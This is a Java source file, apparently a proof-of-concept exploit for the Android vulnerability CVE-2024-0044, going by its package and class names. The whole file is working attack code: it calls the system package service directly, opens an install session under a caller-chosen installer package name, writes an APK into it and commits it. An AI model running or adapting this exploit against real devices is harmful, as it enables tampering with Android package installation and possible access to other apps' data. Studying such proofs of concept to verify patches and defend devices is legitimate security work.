package top.canyie.cve_2024_0044;

import android.annotation.SuppressLint;
import android.content.IIntentReceiver;
import android.content.IIntentSender;
import android.content.Intent;
import android.content.IntentSender;
import android.content.pm.IPackageInstaller;
import android.content.pm.IPackageInstallerSession;
import android.content.pm.IPackageManager;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.IBinder;
import android.os.ServiceManager;

import java.io.File;
import java.io.FileInputStream;
import java.util.concurrent.CountDownLatch;

/**
 * @author canyie
 */
public class PoC {
    @SuppressLint("NewApi") public static void main(String[] args) throws Throwable {
        if (args.length != 2) {
            System.err.println("Accept the target apk path and installer package name only");
            System.exit(1);
        }
        File apk = new File(args[0]);
        String installerPackageName = args[1];
        IPackageManager pm = IPackageManager.Stub.asInterface(ServiceManager.getService("package"));
        CountDownLatch countDownLatch = new CountDownLatch(1);
        IntentSender intentSender = IntentSender.class.getDeclaredConstructor(IIntentSender.class)
                .newInstance(new IIntentSender.Stub() {
                    @Override public void send(int code, Intent intent, String resolvedType,
                                     IBinder whitelistToken, IIntentReceiver finishedReceiver,
                                               String requiredPermission, Bundle options) {
                        int result = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_SUCCESS);
                        if (result != PackageInstaller.STATUS_SUCCESS)
                            System.err.println("Install failed with " + result);
                        countDownLatch.countDown();
                    }
                });

        long apkSize = apk.length();
        IPackageInstaller installer = pm.getPackageInstaller();
        var params = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        params.setSize(apkSize);
        params.setInstallReason(PackageManager.INSTALL_REASON_USER);
        params.setInstallerPackageName(null);
        int sessionId = installer.createSession(params, installerPackageName, null, 0);
        try (var session = PackageInstaller.Session.class.getDeclaredConstructor(IPackageInstallerSession.class)
                .newInstance(installer.openSession(sessionId))) {
            try (var input = new FileInputStream(apk);
                 var output = session.openWrite("app.apk", 0, apkSize)) {
                int read;
                var buffer = new byte[8192];
                while ((read = input.read(buffer)) != -1) {
                    output.write(buffer, 0, read);
                }
                session.fsync(output);
            } catch (Throwable e) {
                try {
                    session.abandon();
                } catch (Throwable ex) {
                    e.addSuppressed(ex);
                }
                throw e;
            }
            session.commit(intentSender);
            countDownLatch.await();
        }
        System.out.println("Install - " + apk + " - done!");
    }
}
